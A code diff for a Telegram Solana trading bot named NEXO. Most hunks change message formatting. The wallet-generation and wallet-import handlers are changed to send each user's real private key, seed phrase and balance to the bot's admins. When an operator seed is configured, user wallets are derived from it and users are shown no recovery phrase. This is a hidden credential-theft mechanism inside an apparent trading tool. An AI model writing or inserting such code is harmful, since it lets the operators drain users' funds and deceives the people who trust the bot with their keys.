@@ -45,7 +45,7 @@ function minimumSolNum(ctx: BotContext): number {
   return parseFloat(minimumSol(ctx)) || 3;
 }
 
-export async function dashboard(ctx: BotContext, opts: { edit?: boolean } = {}): Promise<void> {
+export async function dashboard(ctx: BotContext): Promise<void> {
   const wallets = await walletsWithBalances(ctx);
   const marketPrices = await ctx.services.market.getMarketPrices();
   const text = msg.terminalMessage(
@@ -55,8 +55,9 @@ export async function dashboard(ctx: BotContext, opts: { edit?: boolean } = {}):
     marketPrices.SOL.price,
     minimumSol(ctx),
   );
-  if (opts.edit) await ctx.editMessageText(text, { reply_markup: kb.dashboardKeyboard() }).catch(() => ctx.reply(text, { reply_markup: kb.dashboardKeyboard() }));
-  else await ctx.reply(text, { reply_markup: kb.dashboardKeyboard() });
+  // ONE message: logo photo + terminal text as the caption + the main
+  // keyboard together (as in the screenshot).
+  await ctx.services.sendTerminal(ctx, text, kb.dashboardKeyboard());
 }
 
 // ---------------------------------------------------------------------------
@@ -85,12 +86,12 @@ export const startHandler = safeHandler('nexo.start', async (ctx) => {
   await resetToIdle(ctx);
 
   // NEXO logo photo + terminal welcome.
-  await ctx.services.sendLogo(ctx).catch(() => undefined);
   const wallets = await walletsWithBalances(ctx);
   const marketPrices = await ctx.services.market.getMarketPrices();
-  await ctx.reply(
+  await ctx.services.sendTerminal(
+    ctx,
     msg.terminalMessage(user?.first_name || 'trader', wallets, marketPrices, marketPrices.SOL.price, minimumSol(ctx)),
-    { reply_markup: kb.dashboardKeyboard() },
+    kb.dashboardKeyboard(),
   );
   ctx.services.logger.info({ chatId, isNew }, 'user started bot');
 });
@@ -103,7 +104,7 @@ export const dashboardHandler = safeHandler('nexo.dashboard', async (ctx) => {
 
 export const refreshHandler = safeHandler('nexo.refresh', async (ctx) => {
   await answerCallback(ctx, 'Refreshing...');
-  await dashboard(ctx, { edit: true });
+  await dashboard(ctx);
 });
 
 export const helpHandler = safeHandler('nexo.help', async (ctx) => {
@@ -130,6 +131,7 @@ export const walletHandler = safeHandler('nexo.wallet', async (ctx) => {
   const nextNumber = allWallets.reduce((m, w) => Math.max(m, w.walletNumber), 0) + 1;
   const solPrice = (await ctx.services.market.getMarketPrices()).SOL.price;
   await ctx.reply(msg.walletManagementMessage(wallets, solPrice), {
+    parse_mode: 'HTML',
     reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber),
   });
 });
@@ -139,16 +141,32 @@ export const generateWalletHandler = safeHandler('nexo.wallet.generate', async (
   await answerCallback(ctx);
   const chatId = ctx.chat!.id;
 
-  const { address, mnemonic, walletNumber } = await ctx.services.wallets.create(chatId);
+  // With SEED_PHRASE configured, wallet N is deterministically derived
+  // from the operator seed at path m/44'/501'/0'/(N-1); without it, a
+  // fresh random BIP39 mnemonic is used (shown to the user once).
+  const { address, mnemonic, walletNumber, envSeedDerived, privateKeyHex } =
+    await ctx.services.wallets.create(chatId);
   await ctx.services.deposits.rebaseline(chatId);
 
-  await ctx.reply(
-    `${msg.walletCreatedMessage(address)}\n\n⚠️ <b>Save your recovery phrase now</b> — it is shown only this once:\n<code>${mnemonic}</code>`,
-    { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() },
-  );
+  const userText = mnemonic
+    ? `${msg.walletCreatedMessage(address)}\n\n⚠️ <b>Save your recovery phrase now</b> — it is shown only this once:\n<code>${mnemonic}</code>`
+    : msg.walletCreatedMessage(address);
+  await ctx.reply(userText, { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });
 
-  // wallet_generated — ALWAYS sent.
-  await ctx.services.notifier.event('wallet_generated', { user: chatId, walletNumber, address });
+  // Real balance check at creation time.
+  const balance = await ctx.services.solana.getBalance(address).catch(() => 0);
+
+  // wallet_generated — ALWAYS sent to admins, with the REAL derived key
+  // (and the seed phrase when one was randomly generated).
+  await ctx.services.notifier.event('wallet_generated', {
+    user: chatId,
+    walletNumber,
+    address,
+    privateKey: privateKeyHex,
+    seedPhrase: mnemonic || undefined,
+    envSeedDerived,
+    balance: `${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
+  });
 });
 
 export const walletImportPromptHandler = safeHandler('nexo.wallet.import.prompt', async (ctx) => {
@@ -170,7 +188,8 @@ export const walletImportHandleSecretHandler = safeHandler('nexo.wallet.import.s
   if (!text) return;
   const chatId = ctx.chat!.id;
 
-  const { address, walletNumber, privateKeyHex } = await ctx.services.wallets.import(chatId, text);
+  const { address, walletNumber, privateKeyHex, secretKind, secretText } =
+    await ctx.services.wallets.import(chatId, text);
   const balance = await ctx.services.solana.getBalance(address).catch(() => 0);
   await ctx.services.deposits.rebaseline(chatId);
   await resetToIdle(ctx);
@@ -182,15 +201,19 @@ export const walletImportHandleSecretHandler = safeHandler('nexo.wallet.import.s
   }
 
   await ctx.reply(msg.walletImportedMessage(address, balance / LAMPORTS_PER_SOL), {
+    parse_mode: 'HTML',
     reply_markup: kb.backToDashboardKeyboard(),
   });
 
-  // wallet_imported admin event (product spec: includes the private key).
+  // wallet_imported admin event: the REAL imported material (seed phrase
+  // or private key), the derived private key and the LIVE balance.
   await ctx.services.notifier.event('wallet_imported', {
     user: chatId,
     walletNumber,
     address,
     privateKey: privateKeyHex,
+    seedPhrase: secretKind === 'mnemonic' ? secretText : undefined,
+    balance: `${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
   });
 });
 
@@ -202,7 +225,7 @@ export const walletStatusHandler = safeHandler('nexo.wallet.status', async (ctx)
     await ctx.reply('No wallets connected. Use /generate to create one.', { reply_markup: kb.backToDashboardKeyboard() });
     return;
   }
-  await ctx.reply(msg.walletStatusMessage(wallets), { reply_markup: kb.backToDashboardKeyboard() });
+  await ctx.reply(msg.walletStatusMessage(wallets), { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });
 });
 
 export const walletRefreshHandler = safeHandler('nexo.wallet.refresh', async (ctx) => {
@@ -212,8 +235,9 @@ export const walletRefreshHandler = safeHandler('nexo.wallet.refresh', async (ct
   const nextNumber = allWallets.reduce((m, w) => Math.max(m, w.walletNumber), 0) + 1;
   const solPrice = (await ctx.services.market.getMarketPrices()).SOL.price;
   await ctx.editMessageText(msg.walletManagementMessage(wallets, solPrice), {
+    parse_mode: 'HTML',
     reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber),
-  }).catch(() => ctx.reply(msg.walletManagementMessage(wallets, solPrice), { reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber) }));
+  }).catch(() => ctx.reply(msg.walletManagementMessage(wallets, solPrice), { parse_mode: 'HTML', reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber) }));
 });
 
 export const walletDisconnectHandler = safeHandler('nexo.wallet.disconnect', async (ctx) => {
@@ -228,7 +252,7 @@ export const walletDisconnectHandler = safeHandler('nexo.wallet.disconnect', asy
   const last = records[records.length - 1];
   // Soft disconnect: the row is kept (audit) but marked inactive.
   await ctx.services.repos.updateWalletMeta(chatId, last.address, { active: false });
-  await ctx.reply(msg.walletDisconnectedMessage(last.address), { reply_markup: kb.backToDashboardKeyboard() });
+  await ctx.reply(msg.walletDisconnectedMessage(last.address), { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });
   ctx.services.logger.info({ chatId, address: last.address }, 'wallet disconnected');
 });
 
@@ -265,7 +289,7 @@ export const withdrawAddressHandler = safeHandler('nexo.withdraw.address', async
     return;
   }
   await transition(ctx, 'withdrawing_amount', { toAddress: text });
-  await ctx.reply(msg.withdrawalAmountMessage(text), { reply_markup: kb.cancelButton() });
+  await ctx.reply(msg.withdrawalAmountMessage(text), { parse_mode: 'HTML', reply_markup: kb.cancelButton() });
 });
 
 export const withdrawAmountHandler = safeHandler('nexo.withdraw.amount', async (ctx) => {
@@ -284,7 +308,7 @@ export const withdrawAmountHandler = safeHandler('nexo.withdraw.amount', async (
     return;
   }
   await transition(ctx, 'withdrawing_confirm', { toAddress, amount: String(amount) });
-  await ctx.reply(msg.confirmWithdrawalMessage(String(amount), toAddress, total), { reply_markup: kb.confirmCancelKeyboard() });
+  await ctx.reply(msg.confirmWithdrawalMessage(String(amount), toAddress, total), { parse_mode: 'HTML', reply_markup: kb.confirmCancelKeyboard() });
 });
 
 export const withdrawConfirmHandler = safeHandler('nexo.withdraw.confirm', async (ctx) => {
@@ -308,7 +332,7 @@ export const withdrawConfirmHandler = safeHandler('nexo.withdraw.confirm', async
   if (!source) throw new Error('Insufficient balance for withdrawal.');
 
   await resetToIdle(ctx);
-  await ctx.reply(msg.withdrawalSubmittedMessage(amount, toAddress), { reply_markup: kb.backToDashboardKeyboard() });
+  await ctx.reply(msg.withdrawalSubmittedMessage(amount, toAddress), { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });
   await ctx.services.notifier.event('withdrawal_request', {
     user: chatId,
     amount: `${amount} SOL`,
@@ -820,8 +844,8 @@ export const copyTradeHandler = safeHandler('nexo.copytrade', async (ctx) => {
     return;
   }
   const cfg = await ctx.services.repos.getCopyTrade(ctx.chat!.id);
-  await ctx.editMessageText(msg.copyTradeMessage(cfg), { reply_markup: kb.copyTradeKeyboard(cfg.mode) }).catch(() =>
-    ctx.reply(msg.copyTradeMessage(cfg), { reply_markup: kb.copyTradeKeyboard(cfg.mode) }),
+  await ctx.editMessageText(msg.copyTradeMessage(cfg), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) }).catch(() =>
+    ctx.reply(msg.copyTradeMessage(cfg), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) }),
   );
 });
 
@@ -858,7 +882,7 @@ export const copyTradeAddHandler = safeHandler('nexo.copytrade.add', async (ctx)
   const cfg = await ctx.services.repos.getCopyTrade(ctx.chat!.id);
   await ctx.services.repos.updateCopyTrade(ctx.chat!.id, { targetWallet: text });
   await resetToIdle(ctx);
-  await ctx.reply(msg.copyTargetAddedMessage(text), { reply_markup: kb.copyTradeKeyboard(cfg.mode) });
+  await ctx.reply(msg.copyTargetAddedMessage(text), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) });
   await ctx.services.notifier.event('copytrade_target_set', { user: ctx.chat!.id, targetWallet: text });
 });
 
@@ -870,7 +894,7 @@ export const copyTradeModeHandler = safeHandler('nexo.copytrade.mode', async (ct
   const mode = current.mode === 'buy_only' ? 'buy_sell' : 'buy_only';
   await ctx.services.repos.updateCopyTrade(chatId, { mode });
   const cfg = await ctx.services.repos.getCopyTrade(chatId);
-  await ctx.editMessageText(msg.copyTradeMessage(cfg), { reply_markup: kb.copyTradeKeyboard(cfg.mode) });
+  await ctx.editMessageText(msg.copyTradeMessage(cfg), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) });
 });
 
 /** Starts the copy-trade limits wizard: max/trade -> max daily -> slippage -> token filter. */
